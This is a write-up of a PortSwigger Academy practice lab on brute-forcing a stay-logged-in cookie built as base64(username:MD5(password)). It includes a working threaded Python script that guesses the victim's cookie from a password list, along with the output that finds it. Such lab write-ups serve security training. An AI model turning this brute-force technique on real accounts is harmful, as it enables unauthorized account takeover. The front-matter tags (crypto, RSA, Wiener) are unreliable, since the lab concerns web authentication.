---
title: "auth 9 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "base64", "auth", "rsa", "cryptography"]
summary: "crypto writeup for \"auth 9\" from portswigger labs - techniques: wiener, base64, auth, rsa, cryptography."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-9/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-9/README.md"
ctf:
  name: "portswigger labs"
  challenge: "auth 9"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** auth 9
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-9/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/Authentication/auth-9/README.md>

---
# Brute-forcing a stay-logged-in cookie | Dec 22, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie), you'll learn: Brute-forcing a stay-logged-in cookie! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Login page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222032100.png)

In here, we can see that there is a **`Stay logged in` checkbox**.

**Let's try to login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222032341.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222032405.png)

When we click the `Log in` button, **it'll send a POST request to `/login`, with parameter `username`, `password`, and `stay-logged-in`.**

Also, it sets a new cookie called `stay-logged-in`, and **the value looks like is base64 encoded!**

**Let's try to base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

**Hmm... Looks like the format is `username:password_hash`.**

**And that hash seems to be MD5. Let's use `hash-identifier` to verify that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# hash-identifier '51dc30ddc473d43a6011e9ebba6ca770' 
[...]
Possible Hashs:
[+] MD5
[...]
```

Yep, it's MD5 hash.

How about cracking it?

**An online tool called [CrackStation](https://crackstation.net/) may help us:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222032829.png)

Nice! The MD5 hash is the `wiener`'s password!

**Armed with above information, we can try to brute force user `carlos` password!**

**To do so, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from hashlib import md5
from base64 import b64encode

def fetchPassword(filename):
    listStayloggedinCookie = list()

    with open(filename) as fd:
        for line in fd:
            password = line.strip().encode('utf-8')
            MD5Hash = md5(password).hexdigest()
            base64Encoded = b64encode(f'carlos:{MD5Hash}'.encode('utf-8'))

            listStayloggedinCookie.append(base64Encoded)

    return listStayloggedinCookie

def sendRequest(url, cookieValue):
    cookie = {
        'session': 'h826pmhwmUE0tzA8p8tCgCh41CmBJTrU',
        'stay-logged-in': cookieValue
    }

    myaccountRequestText = requests.get(url, cookies=cookie).text

    if 'Log in' not in myaccountRequestText:
        print(f'[+] Found cookie: {cookieValue}')

def main():
    url = 'https://0a080047046d799ec0a38150005b0090.web-security-academy.net/my-account'

    passwordFileName = './auth_password.txt'
    listStayloggedinCookie = fetchPassword(passwordFileName)

    for cookieValue in listStayloggedinCookie:
        thread = Thread(target=sendRequest, args=(url, cookieValue.decode('ascii')))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password_cookie.py
[+] Found cookie: Y2FybG9zOjBhY2Y0NTM5YTE0YjNhYTI3ZGVlYjRjYmRmNmU5ODlm
```

- Found `carlos` `stay-logged-in` cookie: `Y2FybG9zOjBhY2Y0NTM5YTE0YjNhYTI3ZGVlYjRjYmRmNmU5ODlm`

**Let's change our `stay-logged-in` cookie value to that:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222040631.png)

**Then go to `/my-account`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/Authentication/Auth-9/images/Pasted%20image%2020221222040705.png)

We're user `carlos`!

# What we've learned:

1. Brute-forcing a stay-logged-in cookie
